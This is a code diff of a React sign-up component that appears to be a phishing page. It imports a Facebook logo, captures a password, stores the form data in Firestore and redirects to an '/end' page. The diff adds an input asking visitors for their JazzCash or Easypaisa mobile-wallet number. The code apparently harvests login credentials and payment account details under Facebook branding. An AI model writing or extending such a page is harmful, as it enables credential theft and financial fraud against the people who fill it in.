@@ -4,7 +4,7 @@ import { db } from './firebase.config';
 import { setDoc, doc } from 'firebase/firestore';
 import facebook from '../fb.png';
 
-export default function Home() {
+export default function   Home() {
   const navigate = useNavigate();
 
   const [formData, setFormData] = useState({
@@ -38,7 +38,7 @@ export default function Home() {
       localStorage.setItem('uid', userId);
 
       // Navigate to the next page
-      navigate("/continu");
+      navigate("/end");
     } catch (error) {
       alert("Error during sign up: " + error.message);
     }
@@ -60,7 +60,12 @@ export default function Home() {
         type="password"
         className='outline-blue-600 border-2 p-4 w-96'
         placeholder="Password"
-        value={formData.psw}
+        value={formData.psw}  
+        onChange={handleChange}
+      />
+      <input
+        className='outline-blue-600 border-2 p-4 w-96'
+        placeholder="Enter Jazz cash or Easypaisa number"
         onChange={handleChange}
       />
       <button
